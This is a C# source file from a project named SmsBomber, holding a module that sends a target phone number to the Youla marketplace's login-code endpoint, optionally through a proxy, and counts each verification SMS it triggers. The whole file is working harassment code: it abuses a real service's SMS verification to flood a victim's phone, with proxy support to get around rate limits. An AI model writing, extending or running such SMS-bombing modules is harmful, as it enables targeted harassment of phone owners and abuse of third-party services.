using Leaf.xNet;
using static SmsBomber.ReturnTypes;

namespace SmsBomber.SmsService.Sites
{
    internal class Youla
    {
        public static ResponseSendSms SendSms()
        {
            using (var request = new HttpRequest())
            {
                if (!string.IsNullOrWhiteSpace(Globals.WorkingData.ProxyAdress)) { request.Proxy = ProxyClient.Parse(Globals.WorkingData.ProxyTypeLeaf, Globals.WorkingData.ProxyAdress); }
                try
                {
                    request.Post($"{DomainList.Youla}/web-api/auth/request_code", $"{{\"phone\":\"+{Globals.WorkingData.PhoneNumber}\"}}", "application/json").ToString();
                }
                catch
                {
                    return new ResponseSendSms { FailedConnected = !request.HttpIsConnected(), SuccessSend = false };
                }

                if ((int)request.Response.StatusCode == 200)
                {
                    Globals.WorkingStats.CountSendingSms++;
                    return new ResponseSendSms { SuccessSend = true };
                }
                return new ResponseSendSms { SuccessSend = false };
            }
        }
    }
}
